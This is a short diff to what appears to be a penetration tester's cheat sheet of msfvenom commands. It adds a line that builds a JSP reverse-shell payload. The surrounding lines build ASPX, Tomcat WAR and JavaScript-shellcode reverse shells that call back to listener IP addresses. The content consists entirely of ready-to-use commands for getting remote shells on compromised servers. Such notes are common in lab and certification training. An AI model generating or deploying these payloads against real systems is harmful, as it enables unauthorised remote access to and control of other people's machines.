@@ -33,6 +33,9 @@ msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=443 -o shell64
 # Apache Tomcat War
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.179 LPORT=8080 -f war > shell.war
 
+# Jsp Reverse
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.238 LPORT=80 -f raw > shell.jsp
+
 # Javascript Shellcode
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.179 LPORT=443 -f js_le -o shellcode
 
